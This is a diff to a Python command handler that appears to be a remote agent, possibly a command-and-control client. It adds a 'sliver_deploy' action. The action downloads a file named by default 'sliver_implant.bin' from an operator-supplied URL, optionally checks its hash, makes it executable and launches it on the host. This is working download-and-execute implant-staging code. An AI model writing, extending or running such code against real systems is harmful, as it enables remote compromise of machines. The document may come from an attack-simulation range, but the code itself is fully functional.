@@ -482,6 +482,58 @@ def handle_command(cmd):
         return_output(cmd_id, "network metadata posted" if ok else "network metadata failed")
     elif action == "info":
         return_output(cmd_id, json.dumps(get_system_info(), indent=2))
+    elif action == "sliver_deploy":
+        url = parameters.get("url")
+        file_name = parameters.get("file_name") or "sliver_implant.bin"
+        expected_sha = parameters.get("sha256")
+        execute_after = bool(parameters.get("execute"))
+        execute_args = parameters.get("execute_args") or []
+        if isinstance(execute_args, str):
+            execute_args = execute_args.split()
+        if not url:
+            return_output(cmd_id, "sliver_deploy failed: url missing")
+            return
+
+        try:
+            base_dir = os.path.expanduser("~/.cybertwin/sliver_artifacts")
+            os.makedirs(base_dir, exist_ok=True)
+            dest_path = os.path.join(base_dir, file_name)
+
+            res = requests.get(url, timeout=REQ_TIMEOUT, stream=True)
+            if res.status_code != 200:
+                return_output(cmd_id, f"sliver_deploy failed: http {res.status_code}")
+                return
+
+            with open(dest_path, "wb") as handle:
+                for chunk in res.iter_content(chunk_size=1024 * 256):
+                    if chunk:
+                        handle.write(chunk)
+
+            if expected_sha:
+                import hashlib
+                digest = hashlib.sha256()
+                with open(dest_path, "rb") as handle:
+                    for chunk in iter(lambda: handle.read(1024 * 256), b""):
+                        digest.update(chunk)
+                actual_sha = digest.hexdigest()
+                if actual_sha != expected_sha:
+                    return_output(cmd_id, f"sliver_deploy failed: sha256 mismatch ({actual_sha})")
+                    return
+            exec_note = ""
+            if execute_after:
+                try:
+                    os.chmod(dest_path, 0o700)
+                except Exception:
+                    pass
+                try:
+                    proc = subprocess.Popen([dest_path] + list(execute_args))
+                    exec_note = f" (executed pid={proc.pid})"
+                except Exception as e:
+                    exec_note = f" (execute failed: {e})"
+
+            return_output(cmd_id, f"sliver_deploy saved to {dest_path}{exec_note}")
+        except Exception as e:
+            return_output(cmd_id, f"sliver_deploy failed: {e}")
     else:
         return_output(cmd_id, f"Unknown action: {action}")
 
